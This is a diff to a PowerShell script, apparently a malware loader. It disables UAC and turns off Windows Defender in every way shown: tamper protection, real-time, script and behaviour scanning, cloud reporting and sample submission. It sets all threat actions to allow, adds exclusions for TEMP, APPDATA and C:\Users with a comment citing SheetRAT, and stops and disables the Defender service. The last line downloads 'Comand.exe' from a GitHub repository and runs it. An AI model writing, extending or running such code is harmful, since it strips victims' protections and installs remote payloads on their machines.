@@ -24,10 +24,19 @@ Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
 
 #Requires -RunAsAdministrator
 
-# ===== TAMPER PROTECTION =====
+#Requires -RunAsAdministrator
+
+# ===== 1. TAMPER PROTECTION OFF =====
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
 
-# ===== REGISTRY — DISABLE =====
+# ===== 2. START SERVICE BEFORE Set-MpPreference =====
+$svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
+if ($svc -and $svc.Status -ne "Running") {
+    Start-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 3
+}
+
+# ===== 3. REGISTRY POLICIES (work without service) =====
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
 
@@ -36,33 +45,36 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
 
-# ===== Set-MpPreference — DISABLE =====
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -DisableBlockAtFirstSeen $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisablePrivacyMode $true
-Set-MpPreference -DisableArchiveScanning $true
-Set-MpPreference -DisableIntrusionPreventionSystem $true
-Set-MpPreference -DisableScriptScanning $true
+# ===== 4. Set-MpPreference (service alive) =====
+try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
+try { Set-MpPreference -DisableBehaviorMonitoring $true } catch {}
+try { Set-MpPreference -DisableBlockAtFirstSeen $true } catch {}
+try { Set-MpPreference -DisableIOAVProtection $true } catch {}
+try { Set-MpPreference -DisablePrivacyMode $true } catch {}
+try { Set-MpPreference -DisableArchiveScanning $true } catch {}
+try { Set-MpPreference -DisableIntrusionPreventionSystem $true } catch {}
+try { Set-MpPreference -DisableScriptScanning $true } catch {}
+try { Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true } catch {}
+try { Set-MpPreference -SubmitSamplesConsent 2 } catch {}
+try { Set-MpPreference -MAPSReporting 0 } catch {}
+try { Set-MpPreference -HighThreatDefaultAction 6 -Force } catch {}
+try { Set-MpPreference -ModerateThreatDefaultAction 6 } catch {}
+try { Set-MpPreference -LowThreatDefaultAction 6 } catch {}
+try { Set-MpPreference -SevereThreatDefaultAction 6 } catch {}
 
-# ===== Set-MpPreference — SIGNATURES =====
-Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+# ===== 5. WMI EXCLUSION PATHS (like SheetRAT) =====
+try {
+    $wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference
+    $paths = @()
+    if ($env:TEMP) { $paths += $env:TEMP }
+    if ($env:APPDATA) { $paths += $env:APPDATA }
+    $paths += "C:\Users"
+    $wmi.Add("ExclusionPath", $paths)
+} catch {}
 
-# ===== Set-MpPreference — CLOUD & SAMPLES =====
-Set-MpPreference -SubmitSamplesConsent 2
-Set-MpPreference -MAPSReporting 0
+# ===== 6. STOP SERVICE AFTER =====
+sc.exe stop WinDefend
+sc.exe config WinDefend start= disabled
 
-# ===== Set-MpPreference — THREAT ACTIONS =====
-Set-MpPreference -HighThreatDefaultAction 6 -Force
-Set-MpPreference -ModerateThreatDefaultAction 6
-Set-MpPreference -LowThreatDefaultAction 6
-Set-MpPreference -SevereThreatDefaultAction 6
-
-
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Force
 
 $p="$env:TEMP\Comand.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile $p; Start-Process $p
